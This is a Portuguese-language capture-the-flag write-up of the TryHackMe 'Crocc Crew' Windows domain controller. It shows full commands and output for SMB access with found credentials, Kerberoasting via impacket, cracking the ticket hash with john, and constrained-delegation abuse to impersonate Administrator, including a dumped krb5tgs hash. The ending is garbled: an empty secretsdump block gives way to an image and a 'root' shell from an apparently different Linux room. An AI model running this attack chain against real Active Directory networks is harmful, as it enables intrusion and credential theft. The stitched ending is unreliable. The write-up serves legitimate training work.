---
title: THM Crocc Crew Writeup
author: Hastur
date: 2021-09-12 21:00:00 -0300
categories: [Writeups, Try Hack Me]
tags: [THM, Windows, Insane]
image: /thm/thm-crocccrew-logo.png
---

<img src="/thm/thm-crocccrew-logo.png">

<br>


| Nome | [Crocc Crew](https://tryhackme.com/room/crocccrew)    |
|------|-------------|
|OS    | Windows       |
|Nível | Hard      |

<br>

Esta máquina tem algumas flags a mais do que a simples `user.flag` e `root.flag`, aparentemente precisaremos fazer alguns movimentos laterais antes de comprometer o server de forma completa.

<img src="/thm/thm-crocccrew-1.png">

Na descrição do projeto, sabemos que só temos acesso a um segmento de uma rede, um Domain Controller, e aparentemente ele já foi hackeado, a questão é `você consegue encontrar quem fez isso?`.

Vamos começar.

## RECON


### Nmap
```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.255.206 --min-rate=512
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-15 00:55:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2021-09-15T00:56:44+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-06-07T02:37:18
| Not valid after:  2021-12-07T02:37:18
| MD5:   72be 3896 d880 1bc2 2455 1d55 33da 9300
|_SHA-1: bb1b c5bc 3aef ede9 3dc2 8b0d 0b00 c1d3 4371 19f4
|_ssl-date: 2021-09-15T00:58:08+00:00; -1h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC

```

Por se tratar de um Domain Controller, o nmap nos trouxe uma grande quantidade de portas abertas.

### Porta 80

<img src="/thm/thm-crocccrew-2.png">

Encontramos na porta HTTP, uma página aparentemente já rackeada sem links relevantes, ao checar o `/robots.txt`, encontramos dois diretórios desabilitados.

<img src="/thm/thm-crocccrew-3.png">

Ao acessar o `/db-config.bak`, encontramos possíveis credenciais para um banco de dados.

<img src="/thm/thm-crocccrew-4.png">

Já no diretório `/backdoor.php` encontramos uma simulação de shell.

<img src="/thm/thm-crocccrew-5.png">

Aparentemente não passa de um `rabbit role` que nos fará perder tempo, vamos avançar na enumeração.

### Porta 3389 - RDP

Na enumeração com nmap, também encontramos a porta `3389`, que tipicamente é usada para o serviço `RDP`, não temos um usuário e nem uma senha, mas podemos tentar uma conexão com o `rdesktop`.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ rdesktop 10.10.255.206   
```

Entramos na tela de login, não temos credenciais, mas podemos ver um `stick` cortado pela tela no canto inferior direito.

<img src="/thm/thm-crocccrew-6.png">

Podemos rodar o rdesktop em tela cheia para visualizarmos o stick inteiro.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ rdesktop -f 10.10.255.206   
```

<img src="/thm/thm-crocccrew-7.png">

Encontramos as credenciais `Visitor:GuestLogin!`, porém, esta credencial não foi aceita no RDP.
Aparentemente é tudo que encontramos no RDP.

### SMB

O server também tem SMB, vamos tentar um acesso com `null session`.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient -L \\10.10.255.206
Enter WORKGROUP\hastur's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Não temos acesso com null session, mas podemos tentar com as credenciais que encontramos no stick do RDP.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient -L \\10.10.255.206 -U Visitor 
Enter WORKGROUP\Visitor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
Desta vez conseguimos validar a credencial!!!

Vamos nos conectar no diretório `Home`.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient \\\\10.10.255.206\\Home -U Visitor 
Enter WORKGROUP\Visitor's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

                15587583 blocks of size 4096. 11430005 blocks available
smb: \> get user.txt 
getting file \user.txt of size 17 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
Conseguimos nos autenticar conseguimos a primeira flag, a `user.txt`!!!

Porém não foi possível enumerar nenhum outro diretório, vamos continuar as enumerações.

### Kerberos

Vimos na varredura com nmap que a porta 88 está aberta, tipicamente `kerberos`.
Podemos utilizar o `GetUserSPNs.py` para tentarmos obter um `TGT Ticket` com a credencial que temos.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.255.206 -outputfile hash.ker
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)


```

Ótimo, conseguimos nos conectar, e aparentemente o nome do usuário é `password-reset`, mas não obtivemos resposta, isto acontece pelo fato da minha data e hora local, está fora do range do kereros, conforme a mensagem de erro. Precisamos ajustar nossa hora de acordo com a hora do servidor.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ sudo net time set -S 10.10.255.206                                                                           255 ⨯
[sudo] password for hastur: 
```

Agora tentando novamente, conseguimos a hash.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.72.52 -outputfile hash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ls -la
total 16
drwxr-xr-x  2 hastur hastur 4096 Sep 14 21:46 .
drwxr-xr-x 33 hastur hastur 4096 Sep 14  2021 ..
-rw-r--r--  1 hastur hastur 2016 Sep 14 21:46 hash
-rw-r--r--  1 hastur hastur   17 Sep 14  2021 user.txt
                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ cat hash
$krb5tgs$23$*password-reset$COOCTUS.CORP$cooctus.corp/password-reset*$856443556e2d8c04016648f5f7c47aac$ab62d496b9de12bd3b674760f374e6171f73181c5a4f5f3f033f1edb12663d3a264b8d87688689d11dd3eebb20536fceba58cb863736ea0fcb2a46f12e66d8aebb5ccbb9973f09ea22642805b71d58b7faa2e26dc3652c2d4586e95e660a6c98ec4b01c8a1f6258a26dc2839530eab17a6bf4d0430ca01f6fd4371bd6d5ac99563d2d7318e0078bf4c1dad4f42138e0ffb646213794b57d4f0e136929ec40cc28ea114b636919c35e797454bd019b04ee14f60ccaf1a33d6205d7ccf84572362910a9deab4fef36c862509383e23cbf41d1bcd26d64ab6244fcfd8f3653dd86220e564fd7be5ca2c6c6c43f359027831931a9aa0fa7abc1fa4a7b161f78b2385f1383819b53dd39993f23896ed21171b1155f1fa7ae9dfdd5e30282f171928dbfaa7d27ddc686c1f952f7dbaaeaf2649087907be62b0765d045250c84c36b4cb265b62dc85bd37a9ac707706de82002de994e3e86f637dec3ebf8dc5642b7d4fd2a8b2f7d2691d6080d6ab7ffd1af90ac3fb5206327a97e1fbbfd2f7bb47cbd12584b36d161da01e7fc854b35aae246718bec37722bfca3efe069f859d95f98854b9dfe773afbf3380d92ab01d4c09af14dc7563b3d61ebf742c089f58f660fe3f1a25e4a384fb375007e2254cbe88133cf1abaa492e2ea06e1008b154e08827b32468fa75aa811f462d020f4625c1e872cf43f7cc009bc6539fba74de6e39a6ef3d17276f25772fa444b5f1783bfbdb3cb70bbeda45b12f3c9b3cf10a8e341c66016dd6db65a84078d83043b19c359c5adba926713e4a86a12394ec4b05b35402f6cdbe95844b99beb4f8b25fd6b4efba07e3043e2e8643ae992118b20f43865c182505a76be0275d98cdc90efd0f2b3983b0005c23212a55376a7f7d97c6b6999ae0def9f0a9939c59ee364eb486346befe43cf6466d36d07e21b3e499cf80e17b5267fbf4ac59bce60c685aaa5ea012e17802bc983bc74f893923df61fa42f1522a7d4eabc507d08c768d03bf0600f467dad2878c4382a908510a95ef96da80b0add4d898a5986305f776a332f549fa86315d0388b7ff84d833a5b17cb86b49b52063a1b7dd80b71e9b72f067f5ea252564f87c443660eefabd92bea5f86310ca29ad29fa78b7f132cbf9fb301f7f7a69712d54c031d1d47970261ab97b3e942f9e2ccad85c21c66484f39d436a7212b3c2831fa71af179c8b8884a3d6698668d224ebbc4782fdd6de86fa1dc4f84b4baa3c0034e584a4b136f479344d350d0261b2126161898fcaec220111f5fef17e43a3edad0097cb79031ff188064d4095e30f14c85b40fde566fff5d11d4d86409a1594e21fa802b7a5c50
```

Podemos tentar quebrá-la com o `john`.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)
1g 0:00:00:00 DONE (2021-09-14 21:48) 5.555g/s 1319Kp/s 1319Kc/s 1319KC/s rikelme..nichel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Com a credencial `password-reset:resetpassword`, podemos verificar se ele possui a opção `impersonate` habilitada e tentar um `TGT Silver Ticket` no kerberos.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.72.52 -spn HTTP/dc.cooctus.corp -impersonate Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user password-reset or initial TGT not forwardable

```
Aparentemente este `SPN` não é habillitado para delegar um TGT silver ticket para este usuário.
Podemos verificar se existe algum SPN habilitado a delegar com o `impacket-findDelegation.py`.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/findDelegation.py cooctus.corp/password-reset:resetpassword -dc-ip 10.10.72.52
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

AccountName     AccountType  DelegationType                      DelegationRightsTo                  
--------------  -----------  ----------------------------------  -----------------------------------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS   
```

Ótimo, encontramos alternativas para o SPN.

Vamos tentar o Silver Ticket novamente.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.72.52 -spn oakley/DC.COOCTUS.CORP -impersonate Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ls -la
total 20
drwxr-xr-x  2 hastur hastur 4096 Sep 14 22:03 .
drwxr-xr-x 33 hastur hastur 4096 Sep 14 21:56 ..
-rw-r--r--  1 hastur hastur 1565 Sep 14 22:03 Administrator.ccache
-rw-r--r--  1 hastur hastur 2016 Sep 14 21:46 hash
-rw-r--r--  1 hastur hastur   17 Sep 14  2021 user.txt
```

Ótimo, conseguimos recuperar as credenciais do Administrador que foram armazenadas no arquivo `Administrator.ccache`, este arquivo deve ser colocado em uma variável para que possamos utilizá-lo.

```
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ export KRB5CCNAME=Administrator.ccache
```

## Capturando as Hashes

Com as credenciais do Administrador em mãos e salvas em uma variável, podemos utilizar o `secretsdump.py` para capturar as hashes.

```
















<img src="/thm/thm-gamebuzz-11.png">

E consegui o shell `root`!!
A flag `root.txt` se encontra no diretório `/root`.


<br>

E comprometemos o server!!
<br>

<img src="/htb/hackerman.gif">


